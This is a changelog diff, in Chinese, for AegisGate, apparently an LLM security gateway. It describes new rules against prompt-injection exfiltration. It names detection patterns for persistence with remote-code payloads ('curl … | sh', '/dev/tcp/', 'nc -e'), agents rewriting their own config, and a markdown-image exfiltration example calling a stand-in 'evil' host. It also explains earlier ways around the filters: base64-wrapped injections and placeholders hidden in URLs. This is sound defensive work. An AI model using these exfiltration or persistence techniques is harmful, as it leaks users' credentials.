@@ -9,6 +9,48 @@ each. Collapsing those into dated releases is tracked in [ROADMAP.md](ROADMAP.md
 
 ## [Unreleased]
 
+### Added（外泄链路加固 S3：三项独立增量 + 还原侧的位置判据）
+
+四条互不依赖，各自可单独回退。
+
+- **A1 · 解码结果回流。** 多级解码（base64 / hex / URL）出来的文本此前只匹配 `decoded_keywords`
+  那九条关键词，于是把一条注入用 base64 包一层，就能从刚刚扫过外层文本的**每一个**规则族旁边走过去。
+  现在重跑 `direct_patterns` / `system_exfil_patterns` / `tool_call_injection_patterns` 三个指令族，
+  命中记为 `decoded:<规则 ID>`，落进它作为明文时会落进的同一个信号桶——编码过的指令按它本来的分量计。
+  - `html_markdown` / `remote_content` / `spam_noise` 刻意不回流：它们描述文本**怎么写**，解码之后
+    说明不了什么。
+  - 另记一条 `obfuscated:encoded_payload_command`。「有编码载荷」和「载荷里带指令」是两件事，且
+    `obfuscated` 与上述三族分属不同权重桶，不构成重复计分。
+
+- **A2 · 持久化规则（3 条，`tool_call_guard.dangerous_param_patterns`）。** 判定「自启动面 + 拉取远程
+  代码并执行」同时成立：`crontab` / `/etc/cron.*` / `/etc/systemd/system` / `~/.config/systemd/user` /
+  LaunchAgents / LaunchDaemons / `HKCU\...\CurrentVersion\Run` / 启动目录 / `.bashrc` / `.zshrc` /
+  `.profile`，配上 `curl … | sh`、`/dev/tcp/`、`Invoke-Expression`、`nc -e` 之类的载荷。
+  - **单侧一律不判**：写 `.bashrc` 是日常配置，装个 cron 是日常部署。
+  - 第三条针对 agent 改写自身配置（MCP server 定义、`settings.json`、`CLAUDE.md`、skill 文件、
+    `.mcp.json`、`.codex/config.toml`）后接网络命令。
+  - 这三条不在 `_PATH_REFERENCE_PATTERN_IDS` 里，因此**对写文件类工具同样生效**——攻击本身就是那次写入。
+
+- **A3 · markdown 图片外带（1 条正则，登记两处）。** `![](https://evil/?d=KEY)` 渲染即发出请求，不需要
+  点击；而既有的 `html_markdown_patterns` 只有 `<img` 标签，没有 markdown 图片语法。
+  - 规则**要求 query 里带密钥形态或 AegisGate 占位符**，所以既有的「`<img>` 是代码示例里的正常 HTML，
+    不遮挡」这个取舍可以原样保留。
+  - `injection_detector.html_markdown_patterns`：该类别在 `action_map` 里刻意无条目，因此只计分。
+  - `sanitizer.unsafe_markup_patterns`：**执行点**。`OutputSanitizer` 是响应侧最后一个过滤器，跑在
+    `RestorationFilter` 之后，看到的是占位符背后的真实凭据——让那条 URL 走到渲染器就是外泄本身。
+
+- **还原侧的位置判据（3 条）。** `RestorationFilter` 的 exfil 门是「占位符出现 **且** 措辞可疑」；措辞类
+  正则可以改写，不命中就**无条件把占位符还原成真实值写回正文**。也就是说，模型只要把占位符塞进 URL
+  而不带任何可疑措辞，网关会主动把真实密钥写回去。
+  - 新增的三条按**位置**判定：占位符出现在 URL query 值、网络命令的参数位、markdown 图片 URL 里。
+    这些位置正是数据离开本机的地方，换个说法绕不过去。
+  - 测试用的三条语料里没有任何可疑措辞，位置就是全部信号。
+
+- 规则组数不变（仍 31 组），条数 172 → 180；`security_filters.yaml` 实际 32 组 / 228 → 236 条。
+- 新增 `aegisgate/tests/test_exfil_increments.py`（43 条）：12 条攻击语料必须命中，17 条日常开发语料
+  必须一条都不命中；每条新正则另过 `regex_probe` 沙箱与 `test_redos_guard` 的静态预算。
+
+
 ### Changed（行为变更：安全级别三档恢复为三档）
 
 - **`AEGIS_SECURITY_LEVEL=medium` 的阈值系数由 ×1.30 改为 ×1.00**，成为中性档：直接使用策略
